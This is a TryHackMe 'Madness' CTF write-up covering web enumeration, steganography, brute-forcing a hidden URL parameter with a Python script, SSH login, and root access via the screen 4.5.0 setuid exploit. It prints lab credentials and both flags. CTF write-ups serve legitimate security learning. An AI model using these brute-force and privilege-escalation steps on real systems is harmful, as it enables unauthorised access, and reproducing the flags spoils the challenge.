## Madness - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/madness)

<i>Will you be consumed by Madness?

Please note this challenge does not require SSH brute forcing.

Use your skills to access the user and root account!</i>

**IP: 10.10.131.131**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Steganography, Brute Force <br>

**Tools Used**: Nmap, Gobuster, Steghide

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.131.131

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
  |   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
  |_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Apache2 Ubuntu Default Page: It works
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.131.131/ -w /usr/share/wordlists/dirb/common.txt 
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 278]
  /.htpasswd            (Status: 403) [Size: 278]
  /.htaccess            (Status: 403) [Size: 278]
  /index.php            (Status: 200) [Size: 11320]
  /server-status        (Status: 403) [Size: 278]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- While I was waiting for scanners to finish, I explored the web app. In source code, there is a secret message in regards to a image which I downloaded to my Kali.

  ```
  <img src="thm.jpg" class="floating_element"/>
  <!-- They will never find me-->

  wget http://10.10.131.131/thm.jpg
  ```
  
- Alrighty, when I opened that picture nothing was there, I used steghide on it but it needed passphrase, when I checked the header I realise that is messed up. Use `hexedit` and change first 12 bytes to this `FF D8 FF E0  00 10 4A 46  49 46 00 01`, save it and check the image again.
  Now you have a hidden directory!

  ```
  head thm.jpg                   
  �PNG
  ▒
  ��C
   
  
  
  
  
  
  
  
  
  
  
  ▒▒��C
  �����
  
  ���}!1AQa"q2��#B��R��$3br�

  hexedit thm.jpg

  
  hidden directory
  /th1s_1s_h1dd3n
  ```

- After visiting `http://10.10.131.131/th1s_1s_h1dd3n/`, message from the author is shown. In the source code there's a clue on how to find the secret message!

  ```
  Welcome! I have been expecting you!

  To obtain my identity you need to guess my secret!
  
  Secret Entered:
  
  That is wrong! Get outta here!

  <h2>Welcome! I have been expecting you!</h2>
  <p>To obtain my identity you need to guess my secret! </p>
  <!-- It's between 0-99 but I don't think anyone will look here-->
  
  <p>Secret Entered: </p>
  
  <p>That is wrong! Get outta here!</p>
  ```

- OK, nice, the hidden parameter here is `secret` which is reflected in URL `http://10.10.131.131/th1s_1s_h1dd3n/?secret=`, we will have to brute force our way in, let's do it!

---

## ⚙️ Brute Force, Steganography and Shell Access

- So when it comes to brute forcing, there's few ways you can go around. Use Burp, make custom scripts, find tools or if you want to get consumed by madness do it manually.
  I wrote a sscript in Python since it is much faster than running Burp, but I also run Burp after it just to confirm if I got right result with my script. Script was 10230201x faster than Burp!

  ```
  nano brute.py

  import requests

  def main():
  	base_url = "http://10.10.131.131/th1s_1s_h1dd3n/?secret="
  
  	for i in range(100):
  		url = base_url + str(i)
  		response = requests.get(url)
  			
  		if "That is wrong! Get outta here!" not in response.text:
  			print(f"Found valid response with {i}")
  			print(response.text)
  			break
  					
  main()
  ```

  ```
  python3 brute.py 
  Found valid response with 73
  <html>
  <head>
    <title>Hidden Directory</title>
    <link href="stylesheet.css" rel="stylesheet" type="text/css">
  </head>
  <body>
    <div class="main">
  <h2>Welcome! I have been expecting you!</h2>
  <p>To obtain my identity you need to guess my secret! </p>
  <!-- It's between 0-99 but I don't think anyone will look here-->
  
  <p>Secret Entered: 73</p>
  
  <p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
  
  </div>
  </body>
  </html>
  ```

  In Burp, simply intercept the request, send it to repeater, select the number value as payload and change payload type to `Numbers` in range from 0 to 99. When attack finishes, look for difference in length and you'll find the secret message in respose.

  ```
  HTTP/1.1 200 OK
  Date: Thu, 08 May 2025 12:11:25 GMT
  Server: Apache/2.4.18 (Ubuntu)
  Vary: Accept-Encoding
  Content-Length: 445
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8
  
  <html>
  <head>
    <title>Hidden Directory</title>
    <link href="stylesheet.css" rel="stylesheet" type="text/css">
  </head>
    <body>
      <div class="main">
        <h2>Welcome! I have been expecting you!</h2>
        <p>To obtain my identity you need to guess my secret! </p>
        <!-- It's between 0-99 but I don't think anyone will look here-->
        
        <p>Secret Entered: 73</p>
        
        <p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
    
      </div>
    </body>
  </html>
  ```
  
- Perfect, we have password now, or that's what I thought... Here it took me a while to get to the next part since I was trying to decode this string but couldn't do it for a long time.
  At one point, I was going through my previous steps and saw that I've put a note `steghide didn't work on thm.jpg cuz no passphrase` so then I tried it again with newly found string and guess what, it worked!

  ```
  steghide --extract -sf thm.jpg 
  Enter passphrase: 
  wrote extracted data to "hidden.txt".
  
  cat hidden.txt     
  Fine you found the password! 
  
  Here's a username 
  
  wbxre
  
  I didn't say I would make it easy for you!
  ```
  
- Now we have username as well, but... When I used it to login with SSH, it was unsuccessfull. What made my job easier is the hint for first flag `There's something ROTten about this guys name!` which means we have to decode this ROT cipher.

  ```
  echo "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m' 
  joker
  ```

- Let's try again to login with SSH. Nope, doesn't work... We need legit password now since ths string `y2RPJ4QaPF!B` that we have is just a passphrase and not a password at all.

- Hear me out, this is the part where you'll lose your mind and get conusmed by madness like me. I literally tried everything I know, crypto, steghide, binwalk, hexediting again, trying web exploitaiton, etc.
  Trust me, it took me more than an hour to get this one, and it's so simple lol... There's another image in this challenge that contains hidden message, I know that you know it!

  <img src="https://github.com/mauzware/Mauzalyzer-assets/blob/main/madness%20image.jpeg"/>

- So when I downloaded image and ran it through steghide and it revealed the actual password. No passphrase needed for steghide. Now I'm officialy mad right?

  ```
  steghide --extract -sf madness.jpeg                                                   
  Enter passphrase: 
  wrote extracted data to "password.txt".
  
  cat password.txt 
  I didn't think you'd find me! Congratulations!
  
  Here take my password
  
  *axA&GF8dP
  ```

- At this point, I was just hoping that this is and actual password and not another encoded string... I tried SSH, and it worked!

  ```
  ssh joker@10.10.131.131
  joker@10.10.131.131's password: 
  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)
  
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
  
  
  The programs included with the Ubuntu system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.
  
  Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
  applicable law.
  
  Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
  joker@ubuntu:~$ whoami
  joker
  joker@ubuntu:~$ id
  uid=1000(joker) gid=1000(joker) groups=1000(joker)
  ```

- LEGOOOOOOOOOOOOOO, madness defeated, kinda! Flags are next part of the job.

---

## 🧍 User Privilege Escalation

- OK, you can take a breather now, user flag is easy-peasy.

  ```
  joker@ubuntu:~$ ls
  user.txt
  
  joker@ubuntu:~$ cat user.txt 
  THM{d5781e53b130efe2f94f9b0354a5e4ea}
  ```
  
- Moving to escalation for final flag.

---

## 👑 Root Privilege Escalation

- OK, this one was different than usual. When my `sudo -l` got denied, `cronjobs` were empty and `getcap` showed literally nothing, I almost started crying lol... jk. This is what got me to root after a bit of enumeration.

  ```
  find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
  -rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
  -rwsr-xr-- 1 root messagebus 42992 Nov 29  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  -rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
  -rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
  -rwsr-xr-x 1 root root 75304 Mar 26  2019 /usr/bin/gpasswd
  -rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd
  -rwsr-xr-x 1 root root 39904 Mar 26  2019 /usr/bin/newgrp
  -rwsr-xr-x 1 root root 40432 Mar 26  2019 /usr/bin/chsh
  -rwsr-xr-x 1 root root 71824 Mar 26  2019 /usr/bin/chfn
  -rwsr-xr-x 1 root root 136808 Oct 11  2019 /usr/bin/sudo
  -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
  -rwsr-xr-x 1 root root 40128 Mar 26  2019 /bin/su
  -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
  -rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0
  -rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0.old
  -rwsr-xr-x 1 root root 40152 Oct 10  2019 /bin/mount
  -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
  -rwsr-xr-x 1 root root 27608 Oct 10  2019 /bin/umount
  ```
  
- These are the files that we have permission to execute. Out all of these, `/screen` is the only unusual one that I haven't seen yet nor exploited. I found the exploit on GTFOBins, but when I tried it it was unsuccessfull.
  So, I did googled screen 4.5.0 exploit and found the correct one! [This one](https://www.exploit-db.com/exploits/41154) is pretty simple: on target machine create new file, copy/paste the code, change the file to executable and run it. Let's do it.

  ```
  joker@ubuntu:~$ nano screen-exploit.sh
  joker@ubuntu:~$ chmod +x screen-exploit.sh 
  joker@ubuntu:~$ ./screen-exploit.sh 
  ~ gnu/screenroot ~
  [+] First, we create our shell and library...
  /tmp/libhax.c: In function ‘dropshell’:
  /tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
       chmod("/tmp/rootshell", 04755);
       ^
  /tmp/rootshell.c: In function ‘main’:
  /tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
       setuid(0);
       ^
  /tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
       setgid(0);
       ^
  /tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
       seteuid(0);
       ^
  /tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
       setegid(0);
       ^
  /tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
       execvp("/bin/sh", NULL, NULL);
       ^
  [+] Now we create our /etc/ld.so.preload file...
  [+] Triggering...
  ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
  [+] done!
  No Sockets found in /tmp/screens/S-joker.
  
  # whoami
  root
  # id
  uid=0(root) gid=0(root) groups=0(root),1000(joker)
  ```
  
- That's it, read the flag and madness is gone. Peace! 🙌

---

## 🏁 Flags

- **User Flag**: `THM{d5781e53b130efe2f94f9b0354a5e4ea}`
- **Root Flag**: `THM{5ecd98aa66a6abb670184d7547c8124a}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Not losing my mind...`

- What did I learn?
  `New exploit and more steganography techniques.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
